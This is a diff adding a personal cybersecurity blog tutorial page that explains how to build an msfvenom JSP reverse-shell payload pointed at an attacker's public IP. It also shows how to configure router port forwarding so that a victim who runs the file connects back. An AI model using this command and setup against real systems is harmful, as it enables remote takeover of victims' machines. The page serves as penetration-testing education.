@@ -1,0 +1,114 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="utf-8" />
+        <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no" />
+        <meta name="description" content="" />
+        <meta name="author" content="" />
+        <title>Open and forward port</title>
+        <link rel="icon" type="image/x-icon" href="assets/img/favicon.ico" />
+        <!-- Font Awesome icons (free version)-->
+        <script src="https://use.fontawesome.com/releases/v5.15.1/js/all.js" crossorigin="anonymous"></script>
+        <!-- Google fonts-->
+        <link href="https://fonts.googleapis.com/css?family=Saira+Extra+Condensed:500,700" rel="stylesheet" type="text/css" />
+        <link href="https://fonts.googleapis.com/css?family=Muli:400,400i,800,800i" rel="stylesheet" type="text/css" />
+        <!-- Core theme CSS (includes Bootstrap)-->
+        <link href="../css/styles.css" rel="stylesheet" />
+    </head>
+    <body id="page-top">
+        <!-- Navigation-->
+        <nav class="navbar navbar-expand-lg navbar-dark bg-primary fixed-top" id="sideNav">
+            <a class="navbar-brand js-scroll-trigger" href="../index.html">
+                <span class="d-block d-lg-none">Olivier LEUNG</span>
+                <span class="d-none d-lg-block"><img class="img-fluid img-profile rounded-circle mx-auto mb-2" src="../assets/img/profile.jpg" alt="" /></span>
+            </a>
+            <div class="d-none d-lg-block description_profile"> <!--d-none is used for responsiveness of the panel when you shring the window -->
+                <h3>Olivier LEUNG</h3>
+                <div class="subheading_panel">Cybersecurity engineer </div>
+                    <div class="subheading_description">Love testing random cyber stuff !<br>That's by baking we become a baker</div>
+            </div>
+            <!-- button collapse panel when small windows, responsive pane -->
+            <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation"><span class="navbar-toggler-icon"></span></button> 
+            <div class="collapse navbar-collapse" id="navbarSupportedContent">
+                <ul class="navbar-nav">
+                    <li class="nav-item"><a class="nav-link js-scroll-trigger" href="../ctfpage.html">CTF</a></li>
+                    <li class="nav-item"><a class="nav-link js-scroll-trigger" href="../dfirpage.html">DFIR</a></li>
+                    <li class="nav-item"><a class="nav-link js-scroll-trigger" href="../binarypage.html">Binary Exploitation</a></li>
+                    <li class="nav-item"><a class="nav-link js-scroll-trigger" href="../reversepage.html">Reverse Engineering</a></li>
+                    <li class="nav-item"><a class="nav-link js-scroll-trigger" href="../tutorialpage.html">Tutorial</a></li>
+                </ul>
+            </div>
+
+            <div class="d-none d-lg-block social-icons">
+                <a class="social-icon" target="_blank" rel="noopener noreferrer" href="https://www.linkedin.com/in/olivierleung"><i class="fab fa-linkedin-in"></i></a>
+                <a class="social-icon" target="_blank" rel="noopener noreferrer" href="https://github.com/SkallZou"><i class="fab fa-github"></i></a>
+                <a class="social-icon" target="_blank" rel="noopener noreferrer" href="https://twitter.com/olivier_leung"><i class="fab fa-twitter"></i></a>
+            </div>
+        </nav>
+        <!-- Page Content-->
+        <div>
+            <nav class="navbar navbar-expand-lg navbar-dark bg-secondary sticky-top">
+            <h3 class="header-article"><a href="../tutorialpage.html">Tutorial & Cheatseet </a>> Open and forward port</h3>
+            </nav>
+            
+            <section class="article">
+                <div class="d-flex flex-column flex-md-row justify-content-between mb-5">
+                    <div class="flex-grow-1">
+                        <h3 class="mb-0">1/ Network overview</h3>
+                        <p>
+                            We wish to establish a remote connection over internet:
+                            <img src="img/OpenForwardPort/process.jpeg" class="img-fluid" width="700">
+                            
+                            The scenario is that the victim machine has downloaded a malicious file, and run it on his system. The malicious program will send the network packet back to the attacker machine. So those network packets must pass through the attacker's router or firewall. If the port used by the malicious program is not open on the attacker router, the program will never communicate with the attacker, so the attack won't be successful. <br>
+                            <br>When simulating an attack on a local network, most of the time, the communication will never pass through the router so the meterpreter connection can be made and the attacker can open a reverse shell. <br>
+                            <br>Let's say we're going to create a malicious program with <strong>msfvenom</strong>, instead of providing our private address, we will provide our public address. So when the program will reverse the connection, the router has to know which machine is listening on that port and transfer the network packet to this machine. That's where <strong>port forwarding</strong> will be necessary. <br>
+                            <img src="img/OpenForwardPort/portforward.jpeg" class="img-fluid" width="500">
+
+                            To find your public ip address you can check it on different websites such as <a href="https://www.whatismyip.com">whatismyip.com</a>, for your private address and the IP address of the router, it will depends on if you're on Linux of Windows.
+
+                            <ul>
+                                <li>On Windows, a simple ipconfig /all will give enough information about your network.</li>
+                                <li>On Linux, <strong>ip addr</strong> is used to know your local IP address and <strong>route -n</strong> give you the IP address of your router</li>
+                            </ul>
+                        </p>
+                        <br>
+                    </div>
+                </div>
+            </section>
+            <section class="article">
+                <div class="d-flex flex-column flex-md-row justify-content-between mb-5">
+                    <div class="flex-grow-1">
+                        <h3 class="mb-0">2/ Creating a payload</h3>
+                        <p>
+                            <strong>Msfvenom</strong> is a tool that you can get on a Kali Linux, it is an amazing tool that can generate a malicious payload. So we can create a payload to open a reverse shell when the process is running on a web server for example. <br>
+
+                            <br><strong><i>Msfvenom -p java/jsp_shell_reverse_tcp LHOST=[Your public IP address] LPORT=[Port to listen] -f raw > shell.jsp</i></strong><br>
+                            <br>On this example, we are creating a malicious JSP payload and store it on a file called "shell.jsp".
+                        </p>
+                    </div>
+                </div>
+            </section>
+            <section class="article">
+                <div class="d-flex flex-column flex-md-row justify-content-between mb-5">
+                    <div class="flex-grow-1">
+                        <h3 class="mb-0">3/ Port forwarding</h3>
+                        <p>
+                            We have created our malicious file, but since that we won't be in the same network as the victim machine, we must modify some settings in our router. Port forwarding is to indicate to our router that we are going to open a specific port for a service and whenever there is a network packet for that specific port then the router must send the packet to an IP address.
+                            <img src="img/OpenForwardPort/router.png" class="img-fluid" width="700">
+                            Chose a port, it can be different from the one of the screenshot but make sure to always chose the same one so you don't have to do another <strong>port forwarding</strong> in your router. For the field "Server IP Address", enter your local IP address of your system and not your virtual machine even if you want to listen on that port with your virtual machine. <br>
+                            <br>Now the router will forward every packet that has 4444 as destination port to the IP address 10.0.0.2 <br>
+                            Let's say now, our metasploit console is on our virtual machine, we must forward the packet I received from our local machine to our virtual machine. For this tutorial, I'll modify the configuration on VMware, if you're in another hypervisor, it should be almost the same.
+                        </p>
+                    </div>
+                </div>
+            </section>
+        </div>
+        <!-- Bootstrap core JS-->
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+        <script src="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/js/bootstrap.bundle.min.js"></script>
+        <!-- Third party plugin JS-->
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery-easing/1.4.1/jquery.easing.min.js"></script>
+        <!-- Core theme JS-->
+        <script src="js/scripts.js"></script>
+    </body>
+</html>
